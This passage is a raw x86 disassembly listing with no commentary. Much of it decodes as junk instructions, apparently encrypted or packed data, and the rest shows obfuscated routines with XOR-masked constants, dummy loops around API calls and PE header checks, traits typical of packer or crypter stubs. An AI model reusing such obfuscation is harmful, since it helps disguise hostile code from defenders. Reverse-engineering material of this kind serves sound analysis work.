  413959:	mul    esp
  41395b:	pop    ebp
  41395c:	xor    cl,BYTE PTR ds:0xb2f17e37
  413962:	jno    0x4139d5
  413964:	cmp    BYTE PTR [ebx+esi*4],0xe4
  413968:	cld    
  413969:	xchg   ecx,eax
  41396a:	push   ecx
  41396b:	jg     0x4139da
  41396d:	mov    edi,0xe0527a8b
  413972:	loope  0x4139ef
  413974:	or     eax,ecx
  413976:	mov    eax,0xcab97f6c
  41397b:	fisttp DWORD PTR [eax+esi*1-0x78]
  41397f:	ss mov ebp,0xaca15cc2
  413985:	add    al,0x16
  413987:	rcl    ebx,1
  413989:	jb     0x413944
  41398b:	jp     0x4139a9
  41398d:	mov    ah,0x3b
  41398f:	test   ebx,0xf23969a5
  413995:	xchg   ebx,eax
  413996:	xchg   esi,eax
  413997:	dec    ebp
  413998:	mov    bl,0xf7
  41399a:	sbb    eax,0xeafbd953
  41399f:	enter  0x12e0,0xc8
  4139a3:	adc    DWORD PTR [ebx+0x5dd7f646],edi
  4139a9:	fwait
  4139aa:	pop    ebp
  4139ab:	mov    bl,0x70
  4139ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139ae:	addr16 cld 
  4139b0:	push   edi
  4139b1:	leave  
  4139b2:	xor    eax,0xff6c9ea8
  4139b7:	cdq    
  4139b8:	sbb    edi,edx
  4139ba:	xor    DWORD PTR [ebx-0x45c319e0],esi
  4139c0:	cmp    BYTE PTR [eax+0x49],cl
  4139c3:	js     0x4139e4
  4139c5:	and    eax,0x8dfdb220
  4139ca:	mov    ch,0x86
  4139cc:	sbb    al,0x2e
  4139ce:	ret    
  4139cf:	std    
  4139d0:	push   eax
  4139d1:	scas   eax,DWORD PTR es:[edi]
  4139d2:	popa   
  4139d3:	sub    eax,DWORD PTR [ecx-0x58]
  4139d6:	pop    ebp
  4139d7:	jb     0x4139e9
  4139d9:	enter  0xdf1f,0x92
  4139dd:	(bad)  
  4139df:	stos   BYTE PTR es:[edi],al
  4139e0:	xor    eax,0x7ac4fc60
  4139e5:	cmp    eax,0x1be11eb2
  4139ea:	ficomp WORD PTR [eax+0x5c]
  4139ed:	mov    bl,0xd8
  4139ef:	dec    edi
  4139f0:	retf   
  4139f1:	jmp    0x14104fab
  4139f6:	mov    dh,0xfb
  4139f8:	ret    0x286c
  4139fb:	mov    al,ds:0x5668a64
  413a00:	cmp    edx,eax
  413a02:	xchg   edi,eax
  413a03:	add    bh,BYTE PTR [ebx]
  413a05:	inc    edx
  413a06:	add    BYTE PTR [edx-0x39df9688],dl
  413a0c:	data16 add BYTE PTR [ebx+0x3c],dl
  413a10:	inc    edx
  413a11:	imul   esp,DWORD PTR [eax+0x5ac03ea7],0x60
  413a18:	xchg   BYTE PTR [ecx-0x5fff5234],al
  413a1e:	dec    edx
  413a1f:	jo     0x413a17
  413a21:	and    al,0x3a
  413a23:	inc    ebx
  413a24:	ret    
  413a25:	loopne 0x413a3b
  413a27:	call   0x6337824e
  413a2c:	or     al,0xe1
  413a2e:	cmp    edx,DWORD PTR ds:0x6900104f
  413a34:	xchg   esi,eax
  413a35:	sub    BYTE PTR [ebp+0x155e7055],cl
  413a3b:	fmul   st,st(0)
  413a3d:	(bad)  
  413a3e:	jmp    0x220e9e5
  413a43:	push   ecx
  413a44:	pop    edx
  413a45:	ror    DWORD PTR [eax],cl
  413a47:	imul   ebx,DWORD PTR [eax-0x3d82ffec],0x72
  413a4e:	or     eax,0x6fba292a
  413a53:	fxch   st(2)
  413a55:	lds    ebp,FWORD PTR ds:0x43287ee2
  413a5b:	pop    ebp
  413a5c:	adc    al,0x6
  413a5f:	pusha  
  413a60:	push   ebp
  413a61:	adc    al,0x68
  413a63:	mov    al,ds:0x44aa5c3c
  413a68:	rcr    DWORD PTR [ebx+0x54],1
  413a6b:	or     ebx,DWORD PTR [ebx+0x44eeba03]
  413a71:	std    
  413a72:	mov    esp,0x8d093fc3
  413a77:	in     al,0x43
  413a79:	test   BYTE PTR [edx+0x10fd4f5c],bl
  413a7f:	test   BYTE PTR [edx-0x4f],0x86
  413a83:	push   esp
  413a84:	outs   dx,BYTE PTR ds:[esi]
  413a85:	jnp    0x413a16
  413a87:	sbb    al,0xcd
  413a89:	sbb    ebx,DWORD PTR [eax+0x681fc402]
  413a8f:	pop    eax
  413a90:	adc    al,0x9b
  413a92:	(bad)  
  413a93:	clc    
  413a94:	daa    
  413a95:	imul   esp,DWORD PTR [ecx-0x199a34e7],0x6fafbe47
  413a9f:	mov    bh,0xd3
  413aa1:	mov    ds:0xf12e707b,eax
  413aa6:	popfw  
  413aa8:	mov    ah,0xc6
  413aaa:	mov    dh,0x6c
  413aac:	sar    DWORD PTR [ecx],0x27
  413aaf:	pusha  
  413ab0:	pusha  
  413ab1:	lds    edx,FWORD PTR [esi]
  413ab3:	ins    DWORD PTR es:[edi],dx
  413ab4:	cmc    
  413ab5:	push   esp
  413ab6:	sub    BYTE PTR [eax],bl
  413ab8:	retf   0x6fd7
  413abb:	mov    ah,0x87
  413abd:	lahf   
  413abe:	mov    ah,0x1c
  413ac0:	push   ecx
  413ac1:	jp     0x413b1a
  413ac3:	aad    0x3f
  413ac5:	arpl   WORD PTR [eax],si
  413ac7:	jmp    0x982b:0x10acc5b3
  413ace:	sub    ch,BYTE PTR [esi+0x30]
  413ad1:	xchg   esp,eax
  413ad2:	dec    eax
  413ad3:	stos   DWORD PTR es:[edi],eax
  413ad4:	inc    ebp
  413ad5:	xchg   esp,edx
  413ad7:	clc    
  413ad8:	push   es
  413ad9:	xor    DWORD PTR [edx-0x1c3ae908],0xffffff87
  413ae0:	test   al,0x77
  413ae2:	mov    eax,0x6f823a11
  413ae7:	sub    ebx,DWORD PTR [eax-0x69d97c21]
  413aed:	mov    dh,0x5d
  413aef:	es push 0x5db4d4fd
  413af5:	retf   0x79d2
  413af8:	pop    edi
  413af9:	lock imul eax,esi,0xcf1f355f
  413b00:	and    bh,BYTE PTR [esp+ebx*4+0x1dcfe629]
  413b07:	or     cl,cl
  413b09:	pop    ebp
  413b0a:	ficomp WORD PTR [ebx-0x60c58ebe]
  413b10:	mov    eax,ds:0x7b73121a
  413b15:	and    BYTE PTR [edx+0x2],dh
  413b18:	pop    edx
  413b19:	push   esi
  413b1a:	into   
  413b1b:	idiv   DWORD PTR [edx-0xf581da0]
  413b21:	sbb    eax,0x51af314a
  413b26:	repnz imul edi,DWORD PTR [edi+0x4a],0xce25db46
  413b2e:	mov    edi,0x242f79d8
  413b33:	jp     0x413b43
  413b35:	mov    ds:0x4da7a0b6,al
  413b3a:	inc    eax
  413b3b:	imul   DWORD PTR [edx+0x6992fa7a]
  413b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b42:	inc    edi
  413b43:	rcr    BYTE PTR [eax+0x7b],1
  413b46:	and    bl,BYTE PTR [ebx-0x1ac35924]
  413b4c:	mov    al,0x63
  413b4e:	loopne 0x413b65
  413b50:	js     0x413add
  413b52:	mov    dl,0x82
  413b54:	jae    0x413af1
  413b56:	cmp    BYTE PTR [edx+0x49],bh
  413b59:	pop    ds
  413b5a:	inc    ebp
  413b5b:	add    BYTE PTR [ebx+ecx*2+0x39],ch
  413b5f:	jecxz  0x413bdc
  413b61:	or     eax,0x66cc7fc0
  413b66:	ret    
  413b67:	std    
  413b68:	and    al,0xd4
  413b6a:	cmp    al,0x9c
  413b6c:	jo     0x413b35
  413b6e:	sub    ecx,eax
  413b70:	aaa    
  413b71:	fnstenv [ecx-0x75]
  413b74:	hlt    
  413b75:	adc    esi,DWORD PTR [esp+edx*2-0x1c]
  413b79:	cmc    
  413b7a:	(bad)  
  413b7b:	push   0xffffff8a
  413b7d:	loope  0x413b8a
  413b7f:	mov    edx,DWORD PTR [edi+0x27dc050b]
  413b85:	xchg   ecx,eax
  413b86:	test   DWORD PTR [eax],esi
  413b88:	(bad)
  413b8c:	jge    0x413b80
  413b8e:	out    dx,al
  413b8f:	loop   0x413b69
  413b91:	imul   esp,ebx,0x72
  413b94:	sub    al,0xd7
  413b96:	dec    esp
  413b97:	push   sp
  413b99:	adc    esi,DWORD PTR [ebx]
  413b9b:	iret   
  413b9c:	sahf   
  413b9d:	fcmovnb st,st(6)
  413b9f:	adc    DWORD PTR [edi-0x55],edi
  413ba2:	inc    ebp
  413ba3:	sub    dl,dl
  413ba5:	test   eax,0x26502e07
  413baa:	ins    BYTE PTR es:[edi],dx
  413bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bac:	cld    
  413bad:	out    0x3a,al
  413baf:	push   esi
  413bb0:	xchg   ebp,eax
  413bb1:	imul   eax,ebx,0xa483ddb8
  413bb7:	hlt    
  413bb8:	mov    bh,0xf1
  413bba:	mov    al,ds:0xf8e2f25e
  413bbf:	pop    eax
  413bc0:	ds pop edx
  413bc2:	fsubr  DWORD PTR [ebx]
  413bc4:	nop
  413bc5:	imul   esp,DWORD PTR [ebp-0x72],0xffffffee
  413bc9:	dec    ebx
  413bca:	push   cs
  413bcb:	sti    
  413bcc:	les    edi,FWORD PTR [esi+0x420ed1a9]
  413bd2:	add    bh,BYTE PTR [ebp+0x7]
  413bd5:	pop    esi
  413bd6:	cmp    esp,DWORD PTR [edi+0x37762b46]
  413bdc:	adc    DWORD PTR [ebx-0x45],ebp
  413bdf:	sbb    al,0x5b
  413be1:	in     eax,dx
  413be2:	xor    eax,0xe5f90309
  413be7:	cmp    ch,BYTE PTR [ecx+0x3]
  413bea:	rol    DWORD PTR [ebx-0x2fcc0029],1
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421c92
  413c08:	mov    ds:0x421c9a,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421a62
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x4238a8
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a2e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x4238c3
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423986
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a26
  413f9e:	mov    eax,ds:0x421a36
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421a8e
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c16
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x423a00
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	xor    BYTE PTR [ebp+0x467dede3],bl
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	jge    0x41420e
  41425a:	packssdw mm2,QWORD PTR [ebx+edi*2]
  41425e:	lock call 0xe082:0xbaa73026
  414266:	jmp    0x414220
  414268:	pop    edi
  414269:	loop   0x41421f
  41426b:	daa    
  41426c:	out    dx,al
  41426d:	inc    ebp
  41426e:	cld    
  41426f:	lahf   
  414270:	push   ds
  414271:	retf   0xcb85
  414274:	add    al,0x54
  414276:	pusha  
  414277:	pop    es
  414278:	stc    
  414279:	pop    ss
  41427a:	loop   0x4142d1
  41427c:	xor    ah,BYTE PTR [ebx+ecx*2]
  41427f:	aaa    
  414280:	pop    esi
  414281:	dec    esi
  414282:	call   0x1431:0x181b542c
  414289:	daa    
  41428a:	sbb    dl,BYTE PTR [eax+0x3f9e384b]
  414290:	xchg   esp,eax
  414291:	(bad)  
  414292:	std    
  414293:	xor    al,0x81
  414295:	add    al,0x97
  414297:	push   ss
  414298:	add    BYTE PTR [esi+esi*8-0x359d015d],0x6f
  4142a0:	dec    edx
  4142a1:	(bad)
  4142a4:	test   DWORD PTR [edx+0x4cb37139],0x8f57a730
  4142ae:	(bad)  
  4142af:	xchg   esp,eax
  4142b0:	dec    eax
  4142b1:	push   ecx
  4142b2:	dec    ebx
  4142b3:	data16 aas 
  4142b5:	mov    ecx,0x684a5b4
  4142ba:	inc    esp
  4142bb:	mov    ch,0xd1
  4142bd:	xor    ebx,ecx
  4142bf:	fiadd  DWORD PTR [ecx-0x19b3e3a5]
  4142c5:	inc    DWORD PTR [eax]
  4142c7:	push   ebx
  4142c8:	push   ebp
  4142c9:	jb     0x41425c
  4142cb:	add    eax,0xc5ea6aee
  4142d0:	clc    
  4142d1:	repnz repnz add al,0x7f
  4142d5:	ins    DWORD PTR es:[edi],dx
  4142d6:	pop    ss
  4142d7:	aam    0xc6
  4142d9:	fdiv   st,st(5)
  4142db:	add    DWORD PTR [ebx+eax*2],eax
  4142de:	dec    edi
  4142df:	and    esp,DWORD PTR [esi]
  4142e1:	lods   eax,DWORD PTR ds:[esi]
  4142e2:	fst    QWORD PTR [ecx+ecx*4-0x276d3bf6]
  4142e9:	adc    BYTE PTR [ebx+ebx*8-0x22],dl
  4142ed:	pop    ebp
  4142ee:	pop    edi
  4142ef:	sbb    BYTE PTR [si],dl
  4142f2:	xchg   ecx,eax
  4142f3:	test   bh,dl
  4142f5:	cdq    
  4142f6:	cmp    al,0x36
  4142f8:	push   es
  4142f9:	bound  ebx,QWORD PTR [edi]
  4142fb:	pusha  
  4142fc:	retf   
  4142fd:	xchg   edx,eax
  4142fe:	retf   0xbdfd
  414301:	jmp    0x5626:0xd9f2a16a
  414308:	inc    bx
  41430a:	scas   al,BYTE PTR es:[edi]
  41430b:	push   0x9b2042ea
  414310:	scas   al,BYTE PTR es:[edi]
  414311:	pushf  
  414312:	pusha  
  414313:	hlt    
  414314:	dec    ebx
  414315:	mov    ah,0x9d
  414317:	mov    eax,DWORD PTR [edx*1+0x38403e1b]
  41431e:	push   edi
  41431f:	inc    ebx
  414320:	push   ss
  414321:	push   cs
  414322:	xchg   esi,eax
  414323:	xor    dl,ch
  414325:	arpl   ax,bp
  414327:	cmp    dh,ah
  414329:	int3   
  41432a:	push   ss
  41432b:	xor    dh,BYTE PTR [esi]
  41432d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432e:	iret   
  41432f:	pop    ebp
  414330:	js     0x414390
  414332:	and    DWORD PTR [edi+ecx*1],esi
  414335:	jge    0x414314
  414337:	in     al,dx
  414338:	jle    0x41432a
  41433a:	fstp   TBYTE PTR [eax]
  41433c:	jnp    0x4142da
  41433e:	ret    
  41433f:	adc    BYTE PTR [edx],al
  414341:	je     0x4142cc
  414343:	sbb    ebp,DWORD PTR [edx+0x572e7f73]
  414349:	adc    al,0x6d
  41434b:	mov    edx,DWORD PTR [edi+esi*2]
  41434e:	mov    esi,edi
  414350:	fistp  WORD PTR [edx]
  414352:	mov    ebp,0x9e8f62cc
  414357:	inc    edx
  414358:	or     BYTE PTR [ebx+0x7cba629],cl
  41435e:	and    BYTE PTR [edx],ah
  414360:	sub    BYTE PTR [edx-0x44],0xbf
  414364:	in     al,0xb1
  414366:	das    
  414367:	fiadd  WORD PTR [ecx]
  414369:	call   0xe2ed:0x1ea17797
  414370:	mov    esi,0x7e675e21
  414375:	test   al,0x69
  414377:	mov    dl,0xd3
  414379:	je     0x4143e8
  41437b:	inc    ecx
